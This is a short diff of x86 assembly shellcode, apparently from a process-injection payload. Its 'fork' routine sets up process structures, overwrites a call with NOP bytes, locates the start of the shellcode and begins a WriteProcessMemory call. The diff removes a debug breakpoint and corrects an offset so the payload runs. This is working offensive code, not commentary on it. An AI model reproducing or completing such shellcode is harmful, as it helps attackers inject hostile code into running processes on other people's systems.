@@ -105,7 +105,6 @@ _start:
     ; ======= Function: fork
     fork:
     	; ======= Create STARTUPINFO object ==========================
-	int 3
 	xor eax, eax		; Zero EAX
 	xor ecx, ecx		; Zero ECX
 	mov cl, 0x54		; The size of the STARTUPINFO and PROCESS_INFORMATION structures on the stack
@@ -155,7 +154,7 @@ _start:
 	mov ecx, [ebp-0x10]		; Fork Return
 	mov dword [ecx-5], 0x90909090	; Overwrite first 4 bytes of call
 	mov byte [ecx-1], 0x90		; Overwrite last byte of call
-	sub ecx, 0x1A9			; Bytes to subtract to reach beginning of shellcode, change as needed
+	sub ecx, 0x1A7			; Bytes to subtract to reach beginning of shellcode, change as needed
 
 	; Begin WriteProcessMemory
 	push 0			; lpNumberOfBytesWritten = NULL
